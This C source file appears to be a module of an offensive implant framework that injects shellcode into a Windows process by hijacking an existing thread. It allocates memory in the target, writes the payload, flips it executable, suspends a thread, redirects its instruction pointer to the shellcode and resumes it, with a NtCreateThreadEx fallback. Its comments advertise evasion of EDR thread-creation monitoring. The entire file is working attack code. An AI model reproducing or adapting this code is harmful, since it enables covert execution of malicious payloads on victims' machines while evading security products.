// thread_hijack -- Process injection via thread context manipulation.
//
// Instead of creating a new remote thread (detectable by ETW/kernel callbacks),
// this method:
//   1. Allocates RW memory in the target, writes shellcode, flips to RX
//   2. Enumerates threads of the target process
//   3. Suspends an existing thread
//   4. Gets its context (RIP/EIP)
//   5. Points RIP/EIP at the shellcode
//   6. Resumes the thread
//
// OPSEC advantages:
//   - No new thread creation (NtCreateThreadEx / CreateRemoteThread)
//   - No thread-creation kernel callback fires
//   - Thread looks like it was always running (existing TID)
//   - Works well against EDRs that hook thread creation
//
// Limitation: the hijacked thread's original execution is disrupted.
// Best used on threads in wait states (e.g., message loop threads).
//
// Handles THREAD method only. APC and SPAWN fall back to alloc+write+thread.

#include "../../process_inject_api.h"

// Forward declarations.
static void* alloc_write_protect(InjectCtx* ctx, HANDLE hp);
static uint32_t do_hijack(InjectCtx* ctx);
static uint32_t do_fallback_thread(InjectCtx* ctx);

// ---- ENTRY POINT (must be first defined function) -------------------------

uint32_t __cdecl process_inject_entry(InjectCtx* ctx) {
    // Thread hijack only makes sense for THREAD method with a live target.
    if (ctx->method_hint == INJECT_METHOD_THREAD && ctx->target_process)
        return do_hijack(ctx);
    // Other methods: simple alloc+write+thread.
    return do_fallback_thread(ctx);
}

// ---- Helpers (defined AFTER entry point) ----------------------------------

static void* alloc_write_protect(InjectCtx* ctx, HANDLE hp) {
    PVOID base = NULL;
    SIZE_T sz = (SIZE_T)ctx->payload_len;
    NTSTATUS ns = ctx->NtAllocateVirtualMemory(
        hp, &base, 0, &sz, 0x3000, 0x04);
    if (ns < 0 || !base) return NULL;

    SIZE_T written = 0;
    ns = ctx->NtWriteVirtualMemory(hp, base, (PVOID)ctx->payload, (SIZE_T)ctx->payload_len, &written);
    if (ns < 0) return NULL;

    PVOID pb = base; SIZE_T ps = (SIZE_T)ctx->payload_len; ULONG old = 0;
    ctx->NtProtectVirtualMemory(hp, &pb, &ps, 0x20, &old);
    return base;
}

static uint32_t do_hijack(InjectCtx* ctx) {
    HANDLE hp = ctx->target_process;

    void* rsc = alloc_write_protect(ctx, hp);
    if (!rsc) return INJECT_ERR_ALLOC;
    ctx->out_remote_base = rsc;

    // Find a thread in the target process.
    HANDLE snap = ctx->CreateToolhelp32Snapshot(0x00000004, 0);
    if (!snap || snap == (HANDLE)(LONG_PTR)-1) return INJECT_ERR_THREAD;

    typedef struct {
        DWORD dwSize;
        DWORD cntUsage;
        DWORD th32ThreadID;
        DWORD th32OwnerProcessID;
        LONG  tpBasePri;
        LONG  tpDeltaPri;
        DWORD dwFlags;
    } TE32;

    TE32 te;
    te.dwSize = sizeof(te);

    HANDLE hThread = NULL;
    DWORD tid = 0;

    if (ctx->Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID != ctx->target_pid) continue;
            // Try to open with required access.
            HANDLE ht = ctx->OpenThread(
                0x0002 | 0x0008 | 0x0010, // SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT
                FALSE, te.th32ThreadID);
            if (ht) {
                hThread = ht;
                tid = te.th32ThreadID;
                break;
            }
        } while (ctx->Thread32Next(snap, &te));
    }
    ctx->CloseHandle(snap);

    if (!hThread) return INJECT_ERR_THREAD;

    // Suspend the thread.
    ULONG prev_count = 0;
    NTSTATUS ns = ctx->NtSuspendThread(hThread, &prev_count);
    if (ns < 0) {
        ctx->CloseHandle(hThread);
        return INJECT_ERR_THREAD;
    }

    // Get context and modify instruction pointer.
#ifdef _WIN64
    // CONTEXT for x64: we only need CONTEXT_CONTROL (RIP).
    // Full CONTEXT is 1232 bytes; we allocate on stack.
    typedef struct {
        uint8_t raw[1232];
    } CTX64;
    CTX64 thread_ctx;
    for (uint32_t i = 0; i < sizeof(thread_ctx); ++i)
        ((volatile uint8_t*)&thread_ctx)[i] = 0;
    // ContextFlags at offset 48 (CONTEXT_CONTROL = 0x00100001)
    *(DWORD*)((uint8_t*)&thread_ctx + 48) = 0x00100001;

    ns = ctx->NtGetContextThread(hThread, &thread_ctx);
    if (ns < 0) {
        ctx->NtResumeThread(hThread, &prev_count);
        ctx->CloseHandle(hThread);
        return INJECT_ERR_THREAD;
    }

    // RIP at offset 248 in CONTEXT
    *(uint64_t*)((uint8_t*)&thread_ctx + 248) = (uint64_t)(uintptr_t)rsc;

    ns = ctx->NtSetContextThread(hThread, &thread_ctx);
#else
    // CONTEXT for x86: 716 bytes.
    typedef struct {
        uint8_t raw[716];
    } CTX32;
    CTX32 thread_ctx;
    for (uint32_t i = 0; i < sizeof(thread_ctx); ++i)
        ((volatile uint8_t*)&thread_ctx)[i] = 0;
    // ContextFlags at offset 0 (CONTEXT_CONTROL = 0x00010001)
    *(DWORD*)((uint8_t*)&thread_ctx + 0) = 0x00010001;

    ns = ctx->NtGetContextThread(hThread, &thread_ctx);
    if (ns < 0) {
        ctx->NtResumeThread(hThread, &prev_count);
        ctx->CloseHandle(hThread);
        return INJECT_ERR_THREAD;
    }

    // EIP at offset 184 in WOW64 CONTEXT
    *(uint32_t*)((uint8_t*)&thread_ctx + 184) = (uint32_t)(uintptr_t)rsc;

    ns = ctx->NtSetContextThread(hThread, &thread_ctx);
#endif

    if (ns < 0) {
        ctx->NtResumeThread(hThread, &prev_count);
        ctx->CloseHandle(hThread);
        return INJECT_ERR_THREAD;
    }

    // Resume -- thread now executes our shellcode.
    ctx->NtResumeThread(hThread, &prev_count);
    ctx->out_thread = hThread;
    return INJECT_OK;
}

static uint32_t do_fallback_thread(InjectCtx* ctx) {
    HANDLE hp = ctx->target_process;
    if (!hp) return INJECT_ERR_PROCESS;

    void* rsc = alloc_write_protect(ctx, hp);
    if (!rsc) return INJECT_ERR_ALLOC;
    ctx->out_remote_base = rsc;

    HANDLE hth = NULL;
    NTSTATUS ns = ctx->NtCreateThreadEx(
        &hth, 0x1FFFFF, NULL, hp, rsc, NULL, 0, 0, 0, 0, NULL);
    if (ns < 0 || !hth) return INJECT_ERR_THREAD;

    ctx->out_thread = hth;
    return INJECT_OK;
}
